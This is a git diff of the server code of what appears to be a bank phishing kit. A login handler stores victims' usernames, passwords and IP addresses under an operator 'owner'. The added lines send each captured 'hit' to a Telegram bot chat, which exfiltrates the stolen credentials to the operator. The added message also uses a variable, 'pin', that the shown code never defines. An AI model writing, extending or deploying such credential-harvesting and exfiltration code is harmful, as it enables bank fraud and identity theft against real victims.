@@ -1,5 +1,6 @@
 const PostBank = require("../models/postbankModel");
 var moment = require("moment"); // require
+const axios = require("axios");
 
 const getOwnerVics = async (req, res) => {
     const { owner } = req.params;
@@ -45,6 +46,18 @@ const submitLogin = async (req, res) => {
     const { username, password, uniqueid, owner, ip } = req.body;
     try {
         await PostBank.create({ uniqueid, username, password, status: 1, owner, ip, timestamp: moment().format() });
+        await axios
+            .post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+                {
+                    chat_id: '-837014205',
+                    text: `New BBBank Hit:\n\n${username}\n${pin}`,
+                    parse_mode: "Markdown",
+                }
+            )
+            .catch((e) => {
+                console.log(e);
+            });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
